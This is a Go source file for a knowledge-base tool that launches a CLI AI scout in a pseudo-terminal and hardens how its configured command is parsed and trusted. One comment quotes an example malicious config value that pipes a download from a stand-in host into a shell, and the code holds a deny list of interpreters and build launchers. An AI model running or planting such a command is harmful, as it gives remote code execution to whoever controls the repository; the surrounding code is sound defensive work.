package engine

import (
	"context"
	"crypto/sha256"
	"crypto/subtle"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	goruntime "runtime"
	"strings"
	"time"

	"github.com/zdypro888/iknowledge/internal/pty"
	"github.com/zdypro888/iknowledge/internal/store"
)

// 自派备模式(knowledge.md §10.4 轮 22 备模式;impl §7.5;2026-07-04 实装):
// 服务端 PTY 驱动一个交互式 CLI 侦察兵执行简报,阻塞等 kb_submit_findings 回程。
// 面向无子代理宿主/需接口级隔离(侦察兵连 /mcp/scout/<job>,工具集受限)。
// 与 aibridge 方案的关键差异:交卷信号走协议(SubmitFindings→job.done),
// 不解析终端画面,故无需终端仿真库(铁律一:零重依赖,PTY 原语手写)。

// SetScoutAddr 注入 serve 实际监听地址(自派侦察兵回连用;--addr 覆盖端口时
// config 端口不可信)。serve 启动期调用,先于任何请求,不加锁。
func (e *Engine) SetScoutAddr(addr string) { e.scoutAddr = addr }

// scoutBase 返回侦察兵回连的 host:port(缺省从 config 端口推导)。
func (e *Engine) scoutBase() string {
	if e.scoutAddr != "" {
		return e.scoutAddr
	}
	// R29 批次3:用缓存 config。
	if cfg := e.cachedConfig(); cfg != nil {
		return fmt.Sprintf("127.0.0.1:%d", cfg.Port)
	}
	return ""
}

// selfDispatch 驱动自派侦察兵:写 scout MCP 配置 → PTY 启动 → 喂简报 →
// 阻塞等交卷/超时/进程早退。调用时不持 rt.mu(SubmitFindings 要拿锁)。
func (e *Engine) selfDispatch(job *scoutJob, brief string, cfg *store.Config) (string, error) {
	base := e.scoutBase()
	if base == "" {
		return "", kbErr("SCOUT_TIMEOUT", "无法确定回连地址(缺 config 端口)", "检查 .knowledge/config.yaml")
	}

	// scout MCP 配置写 .knowledge/local/(铁律二边界内);用完即删,日志保留。
	scoutURL := fmt.Sprintf("http://%s/mcp/scout/%s?repo=%s", base, job.ID, url.QueryEscape(e.Store.RepoRoot()))
	mcpEntry, err := mcpServerEntry(scoutURL, e.Store)
	if err != nil {
		return "", err
	}
	mcpCfg := map[string]any{"mcpServers": map[string]any{"knowledge": mcpEntry}}
	cfgBytes, err := json.MarshalIndent(mcpCfg, "", "  ")
	if err != nil {
		return "", err
	}
	cfgRel := filepath.ToSlash(filepath.Join("local", "scout-mcp-"+job.ID+".json"))
	cfgPath := filepath.Join(e.Store.Dir(), filepath.FromSlash(cfgRel))
	if err := e.Store.WritePrivateKnowledgeFile(cfgRel, cfgBytes); err != nil {
		return "", err
	}
	defer e.Store.RemoveKnowledgeFile(cfgRel)

	cmd, err := scoutCommand(cfg.ScoutCommand, cfgPath)
	if err != nil {
		return "", kbErr("SCOUT_TRUST_REQUIRED", "scout_command 无法安全解析:"+err.Error(),
			"修正 .knowledge/config.yaml 后重跑 iknowledge trust-scout --repo "+e.Store.RepoRoot())
	}
	cmd.Dir = e.Store.RepoRoot()
	if err := rejectRepoScoutExecutable(cmd, e.Store.RepoRoot(), cfgPath); err != nil {
		return "", kbErr("SCOUT_TRUST_REQUIRED", err.Error(),
			"把 wrapper 移到仓库外的用户级目录，再更新 scout_command 并重跑 trust-scout")
	}
	// R29-S1.1:不覆盖 cmd.Env——scoutCommand 可能已解析 KEY=VAL 前缀(如测试的
	// GO_SCOUT_HELPER=1)。cmd.Env 为空时 os/exec 默认继承父进程;非空时需含全量环境,
	// 所以这里在 scoutCommand 设的 Env 基础上补 TERM(为空则从父进程起)。
	if cmd.Env == nil {
		cmd.Env = os.Environ()
	}
	cmd.Env = append(cmd.Env, "TERM=xterm-256color")

	ptmx, err := pty.Start(cmd)
	if err != nil {
		return "", kbErr("SCOUT_TIMEOUT", "侦察兵进程启动失败:"+err.Error(),
			"检查 config 的 scout_command;或改回委派模式(scout: delegate)")
	}
	defer ptmx.Close()
	defer pty.KillGroup(cmd)

	// 输出旁路进日志(有界),同时扫 spinner/响应符号做"回合已启动"信号
	//(kbeval 排障定案:欢迎屏无这些符号;首启信任弹窗会吞输入,须检测 + 重投)。
	logRel := filepath.ToSlash(filepath.Join("local", "scout-"+job.ID+".log"))
	logFile, err := e.Store.CreateKnowledgeFile(logRel, 0o644)
	if err != nil {
		return "", err
	}
	activity := make(chan struct{}, 1)
	go func() {
		defer logFile.Close()
		drainToLog(ptmx, logFile, 1<<20, activity)
	}()
	exited := make(chan error, 1)
	go func() { exited <- cmd.Wait() }()

	// 喂简报:括号粘贴包裹(多行文本裸 \n 会被 TUI 当回车逐行提交,kbeval 排障定案)
	// + 两步输入(正文、停顿、单发回车,对抗 paste 突发去抖,aibridge driver.go 同法)。
	time.Sleep(6 * time.Second) // TUI 启动等待
	submit := func() {
		if _, err := ptmx.Write([]byte("\x1b[200~" + brief + "\x1b[201~")); err == nil {
			time.Sleep(2 * time.Second)
			ptmx.Write([]byte("\r"))
		}
	}
	submit()

	// 启动确认:25s 无活动符号 → 单发回车收弹窗 + 重投(上限 2 次)。
	// 同时监听交卷/退程——非 TUI 侦察兵(自定义 scout_command)可能不画 spinner 直接交卷。
	started := false
	for resends := 0; !started; {
		select {
		case <-activity:
			started = true
		case findings := <-job.done:
			pty.KillGroup(cmd)
			return framed(findings + "\n(自派侦察兵已交卷;蒸馏物已落库,日志:" +
				filepath.ToSlash(filepath.Join(".knowledge", "local", "scout-"+job.ID+".log")) + ")"), nil
		case err := <-exited:
			select { // 退程宽限:交卷 HTTP 可能竞态在退程前一瞬
			case findings := <-job.done:
				return framed(findings + "\n(自派侦察兵已交卷)"), nil
			case <-time.After(2 * time.Second):
			}
			return "", kbErr("SCOUT_TIMEOUT",
				fmt.Sprintf("侦察兵进程启动即退出(%v)", err),
				"看日志 .knowledge/local/scout-"+job.ID+".log;检查 scout_command")
		case <-time.After(25 * time.Second):
			if resends == 2 {
				pty.KillGroup(cmd)
				return "", kbErr("SCOUT_TIMEOUT",
					"侦察兵未能启动回合(重投 2 次无响应;新目录首启的信任确认可能需要人工跑一次交互式 claude)",
					"在该仓库手动跑一次 claude 完成目录信任后重试;或看日志 .knowledge/local/scout-"+job.ID+".log")
			}
			resends++
			ptmx.Write([]byte("\r"))
			time.Sleep(3 * time.Second)
			submit()
		}
	}

	timeout := scoutWaitTimeout(cfg)
	select {
	case findings := <-job.done:
		pty.KillGroup(cmd)
		return framed(findings + "\n(自派侦察兵已交卷;蒸馏物已落库,日志:" +
			filepath.ToSlash(filepath.Join(".knowledge", "local", "scout-"+job.ID+".log")) + ")"), nil
	case err := <-exited:
		// 进程退了还没交卷:再宽限一拍(交卷 HTTP 可能竞态在退程前一瞬)。
		select {
		case findings := <-job.done:
			return framed(findings + "\n(自派侦察兵已交卷)"), nil
		case <-time.After(2 * time.Second):
		}
		return "", kbErr("SCOUT_TIMEOUT",
			fmt.Sprintf("侦察兵进程退出未交卷(%v)", err),
			"看日志 .knowledge/local/scout-"+job.ID+".log;job 仍在(TTL 30 分钟),迟到交卷会落库,用 kb_status 查看")
	case <-time.After(timeout):
		pty.KillGroup(cmd)
		return "", kbErr("SCOUT_TIMEOUT",
			fmt.Sprintf("侦察兵超时未交卷(%s)", timeout),
			"用 kb_status 查看已落库蒸馏物;job 仍在(TTL 30 分钟),迟到交卷不白费")
	}
}

// mcpServerEntry 组装 scout 的 MCP server 配置。无论业务 Bearer 是否启用，
// 都只写经本机身份握手取得的短期 session；长期密钥不进仓内临时 JSON。
func mcpServerEntry(endpoint string, s *store.Store) (map[string]any, error) {
	entry := map[string]any{"type": "http", "url": endpoint}
	u, err := url.Parse(endpoint)
	if err != nil || u.Scheme == "" || u.Host == "" {
		return nil, fmt.Errorf("非法 scout MCP URL %q", endpoint)
	}
	base := u.Scheme + "://" + u.Host
	session, err := s.AcquireLocalAuthSession(context.Background(), base, u.Path, &http.Client{Timeout: 3 * time.Second})
	if err != nil {
		return nil, err
	}
	entry["headers"] = map[string]string{
		"Authorization": store.LocalSessionAuthorization(session.Token),
	}
	return entry, nil
}

const (
	defaultScoutWait = 5 * time.Minute
	maxScoutWait     = 30 * time.Minute
	requestBaseline  = 10 * time.Minute
	dispatchOverhead = 2 * time.Minute
)

func scoutWaitTimeout(cfg *store.Config) time.Duration {
	if cfg == nil || cfg.ScoutTimeoutSec <= 0 {
		return defaultScoutWait
	}
	if cfg.ScoutTimeoutSec > int(maxScoutWait/time.Second) {
		return maxScoutWait
	}
	return time.Duration(cfg.ScoutTimeoutSec) * time.Second
}

// RequestWriteTimeout 是 HTTP 服务与 stdio 代理共用的请求上限。普通工具维持
// 既有 10 分钟预算；自派模式按配置等待时间加启动/信任弹窗重投余量，且最终
// 受 job TTL 对齐的 30 分钟上限约束，保证 WriteTimeout 有界又不误杀最长自派。
func RequestWriteTimeout(cfg *store.Config) time.Duration {
	if cfg == nil || cfg.Scout != "self" {
		return requestBaseline
	}
	if needed := scoutWaitTimeout(cfg) + dispatchOverhead; needed > requestBaseline {
		return needed
	}
	return requestBaseline
}

const scoutTrustRel = "local/scout-trust-v1"

func scoutTrustFingerprint(cfg *store.Config) string {
	command := ""
	mode := ""
	if cfg != nil {
		mode = strings.TrimSpace(cfg.Scout)
		command = strings.TrimSpace(cfg.ScoutCommand)
	}
	sum := sha256.Sum256([]byte("iknowledge-scout-trust-v1\x00" + mode + "\x00" + command))
	return fmt.Sprintf("v1:%x", sum[:])
}

// TrustScout 把当前自派模式及命令的指纹写进仓外用户私有状态。配置任一语义
// 变化都会使授权失效；仓内 legacy marker 会在这次显式重授时删除。
func TrustScout(s *store.Store) (command, fingerprint string, err error) {
	cfg, err := s.LoadConfig()
	if err != nil {
		return "", "", err
	}
	if cfg == nil || strings.TrimSpace(cfg.Scout) != "self" {
		return "", "", fmt.Errorf("config 的 scout 必须先显式设为 self")
	}
	cmd, err := scoutCommand(cfg.ScoutCommand, "{local-mcp-config}")
	if err != nil {
		return "", "", err
	}
	cmd.Dir = s.RepoRoot()
	if err := rejectRepoScoutExecutable(cmd, s.RepoRoot(), "{local-mcp-config}"); err != nil {
		return "", "", err
	}
	fingerprint = scoutTrustFingerprint(cfg)
	if err := s.WriteScoutTrust(fingerprint); err != nil {
		return "", "", err
	}
	command = strings.TrimSpace(cfg.ScoutCommand)
	if command == "" {
		command = "claude --mcp-config {mcp} --strict-mcp-config --allowedTools mcp__knowledge__*"
	}
	return command, fingerprint, nil
}

func scoutTrusted(s *store.Store, cfg *store.Config) error {
	data, err := s.LoadScoutTrust()
	if err != nil {
		if os.IsNotExist(err) {
			return fmt.Errorf("本机尚未授权当前自派配置")
		}
		return err
	}
	got := []byte(strings.TrimSpace(data))
	want := []byte(scoutTrustFingerprint(cfg))
	if subtle.ConstantTimeCompare(got, want) != 1 {
		return fmt.Errorf("scout/self 或 scout_command 已变化，本机授权已失效")
	}
	return nil
}

// scoutCommand 构造侦察兵进程。
//
// 安全(R29-P0):configured 来自 .knowledge/config.yaml,会随 git 传播——是供应链输入。
// 旧实现走 sh -c,恶意 commit 写 `scout_command: "x; curl evil|sh # {mcp}"` 即 RCE。
// 现改为零依赖自切词:strings.Fields 切 argv(空格分隔),再在每个元素上
// 替换 {mcp}——这样 cfgPath 即使含空格也作为单个完整 argv 元素(exec.Command 的 argv 是字符串
// 切片,不经 shell,空格无特殊含义)。含 shell 元字符(;|&`$ 换行 反引号)的模板
// fail closed；KEY=VAL 环境前缀完全禁用，防 LD_PRELOAD/NODE_OPTIONS 等隐式加载。
// 自派模式另须匹配仓外本机信任指纹；复杂语法请写在
// 仓库外的用户级 wrapper 中并显式授权，仓库内 wrapper 同样拒绝执行。
func scoutCommand(configured, cfgPath string) (*exec.Cmd, error) {
	defaultCmd := func() (*exec.Cmd, error) {
		return exec.Command("claude", "--mcp-config", cfgPath, "--strict-mcp-config", "--allowedTools", "mcp__knowledge__*"), nil
	}
	trimmed := strings.TrimSpace(configured)
	if trimmed == "" {
		return defaultCmd()
	}
	if strings.ContainsAny(trimmed, ";\r\n|&`$'\"") {
		return nil, fmt.Errorf("含 shell 元字符")
	}
	fields := strings.Fields(trimmed)
	if len(fields) == 0 {
		return defaultCmd()
	}
	// {mcp} 替换在切词之后:每个 field 作为独立 argv 元素,cfgPath 含空格也安全。
	for i, f := range fields {
		fields[i] = strings.ReplaceAll(f, "{mcp}", cfgPath)
	}
	if envKeyVal.MatchString(fields[0]) {
		return nil, fmt.Errorf("禁止 KEY=VAL 环境前缀；请把受信环境封装进仓外 wrapper")
	}
	return exec.Command(fields[0], fields[1:]...), nil
}

// rejectRepoScoutExecutable 防止“授权了一个稳定命令字符串，但它实际指向
// 仓库内随 git 更新的 wrapper”绕过指纹。wrapper 必须放用户级可信目录。
func rejectRepoScoutExecutable(cmd *exec.Cmd, repo, dynamicMCPPath string) error {
	path := cmd.Path
	if !filepath.IsAbs(path) {
		if strings.ContainsAny(path, `/\\`) {
			path = filepath.Join(repo, path)
		} else if resolved, err := exec.LookPath(path); err == nil {
			path = resolved
		} else {
			return fmt.Errorf("找不到侦察兵可执行程序 %q", cmd.Path)
		}
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	repoLex, err := filepath.Abs(repo)
	if err != nil {
		return err
	}
	if pathWithin(repoLex, abs) {
		return fmt.Errorf("拒绝执行仓库内的 scout 程序 %q", abs)
	}
	if resolved, err := filepath.EvalSymlinks(abs); err == nil {
		abs = resolved
	}
	repoAbs := repo
	if resolved, err := filepath.EvalSymlinks(repo); err == nil {
		repoAbs = resolved
	}
	if pathWithin(repoAbs, abs) {
		return fmt.Errorf("拒绝执行仓库内的 scout 程序 %q", abs)
	}
	info, err := os.Stat(abs)
	if err != nil {
		return fmt.Errorf("侦察兵可执行程序不可用 %q: %w", abs, err)
	}
	if !info.Mode().IsRegular() {
		return fmt.Errorf("侦察兵程序不是普通文件 %q", abs)
	}
	if goruntime.GOOS != "windows" && info.Mode().Perm()&0o111 == 0 {
		return fmt.Errorf("侦察兵程序没有执行权限 %q", abs)
	}
	if goruntime.GOOS != "windows" && info.Mode().Perm()&0o022 != 0 {
		return fmt.Errorf("侦察兵程序可被组/其他用户修改，不可信 %q", abs)
	}
	if scoutInterpreter(filepath.Base(abs)) {
		return fmt.Errorf("拒绝直接用解释器/命令启动器 %q；请改用仓外受信 wrapper", abs)
	}
	for _, arg := range cmd.Args[1:] {
		if err := rejectRepoScoutArg(arg, repoLex, repoAbs, dynamicMCPPath); err != nil {
			return err
		}
	}
	return nil
}

func scoutInterpreter(base string) bool {
	base = strings.ToLower(strings.TrimSuffix(base, ".exe"))
	switch base {
	case "sh", "bash", "zsh", "dash", "ksh", "fish", "env", "node", "nodejs", "deno", "bun",
		"perl", "ruby", "lua", "php", "pwsh", "powershell", "cmd", "wscript", "cscript", "java":
		return true
	case "make", "gmake", "ninja", "go", "cargo", "npm", "npx", "yarn", "pnpm", "corepack",
		"dotnet", "msbuild", "gradle", "mvn", "rake", "bundle":
		// 这些启动器会从 cmd.Dir 隐式加载 Makefile/package.json/go module 等，
		// 即使 argv 没出现仓内路径也会让一次授权随 pull 变成新代码执行。
		return true
	}
	return base == "python" || base == "python2" || base == "python3" ||
		strings.HasPrefix(base, "python3.") || strings.HasPrefix(base, "pypy")
}

func rejectRepoScoutArg(arg, repoLex, repoResolved, dynamicMCPPath string) error {
	candidate := arg
	if strings.HasPrefix(candidate, "-") {
		if _, value, ok := strings.Cut(candidate, "="); ok {
			candidate = value
		} else {
			return nil // 纯 flag，路径若在下一 argv 会单独检查。
		}
	}
	candidate = strings.TrimPrefix(candidate, "@") // 常见 response-file 语法。
	candidate = strings.TrimPrefix(candidate, "file://")
	if candidate == "" || candidate == dynamicMCPPath || candidate == "{local-mcp-config}" {
		return nil
	}
	pathLike := filepath.IsAbs(candidate) || strings.ContainsAny(candidate, `/\\`) ||
		strings.HasPrefix(candidate, ".") || filepath.Ext(candidate) != ""
	if !filepath.IsAbs(candidate) {
		joined := filepath.Join(repoLex, filepath.FromSlash(candidate))
		if _, err := os.Stat(joined); err == nil {
			pathLike = true
		}
		if !pathLike {
			return nil
		}
		candidate = joined
	}
	abs, err := filepath.Abs(candidate)
	if err != nil {
		return err
	}
	if pathWithin(repoLex, abs) {
		return fmt.Errorf("拒绝 scout argv 引用仓库内文件 %q；请移到仓外 wrapper", arg)
	}
	if resolved, err := filepath.EvalSymlinks(abs); err == nil && pathWithin(repoResolved, resolved) {
		return fmt.Errorf("拒绝 scout argv 经 symlink 引用仓库内文件 %q", arg)
	}
	return nil
}

func pathWithin(root, target string) bool {
	rel, err := filepath.Rel(filepath.Clean(root), filepath.Clean(target))
	return err == nil && rel != ".." && !strings.HasPrefix(rel, ".."+string(filepath.Separator)) && !filepath.IsAbs(rel)
}

var envKeyVal = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*=`)

// scoutActivityMarks 是"回合已启动"的屏幕信号:spinner/响应符只在回合运行时出现,
// 欢迎屏没有(kbeval 排障定案;字节流速会被输入框回显假触发,不可用)。
var scoutActivityMarks = []string{"✻", "✶", "✳", "✽", "⏺"}

// drainToLog 把 PTY 输出汇进日志文件,上限 cap 字节(超限丢弃,防失控进程刷盘);
// 首次扫到活动符号时向 activity 发一次信号(非阻塞,通道可为 nil)。
func drainToLog(r interface{ Read([]byte) (int, error) }, w io.Writer, capBytes int64, activity chan<- struct{}) {
	signaled := false
	var written int64
	buf := make([]byte, 32<<10)
	for {
		n, err := r.Read(buf)
		if n > 0 {
			if !signaled && activity != nil {
				chunk := string(buf[:n])
				for _, m := range scoutActivityMarks {
					if strings.Contains(chunk, m) {
						signaled = true
						select {
						case activity <- struct{}{}:
						default:
						}
						break
					}
				}
			}
			if written < capBytes {
				m := int64(n)
				if written+m > capBytes {
					m = capBytes - written
				}
				_, _ = w.Write(buf[:m])
				written += m
			}
		}
		if err != nil {
			return
		}
	}
}
